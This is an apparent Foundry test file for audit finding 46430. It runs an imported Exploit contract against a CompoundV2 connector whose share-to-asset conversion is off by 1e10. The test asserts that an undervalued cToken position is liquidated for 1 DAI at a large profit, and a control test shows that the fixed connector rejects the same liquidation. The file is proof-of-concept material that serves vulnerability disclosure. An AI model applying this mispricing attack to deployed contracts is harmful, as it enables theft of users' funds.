// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, Dai, CompoundV2ConnectorFixed} from
    "./46430-compoundv2connector-convertsharestoassets-magnitude-scalar-c.sol";

contract Finding46430Test is Test {
    function test_exploit_undervalued_ctoken_is_liquidated_for_1_dai() public {
        Exploit e = new Exploit();
        uint256 beforeBal = e.dai().balanceOf(address(e));
        e.run();

        assertEq(e.priced(), 2e16, "buggy price");
        assertEq(e.seized(), 2e26, "true redeem");
        assertEq(e.priced() * 1e10, e.seized(), "off by 1e10");
        assertEq(e.dai().balanceOf(address(e)) - beforeBal, 2e26 - 1 ether, "profit");
    }

    function test_control_magnitude_18_is_not_liquidatable() public {
        Dai dai = new Dai();
        CompoundV2ConnectorFixed fixedConnector = new CompoundV2ConnectorFixed(dai);
        fixedConnector.load(1e16, 2e28, 1 ether);
        dai.mint(address(fixedConnector), 2e26);
        dai.mint(address(this), 1 ether);
        dai.approve(address(fixedConnector), type(uint256).max);

        assertEq(fixedConnector._convertSharesToAssets(1e16), 2e26, "true price");
        vm.expectRevert(bytes("solvent"));
        fixedConnector.liquidate(address(this));
        assertEq(dai.balanceOf(address(this)), 1 ether, "debt not taken");
    }
}
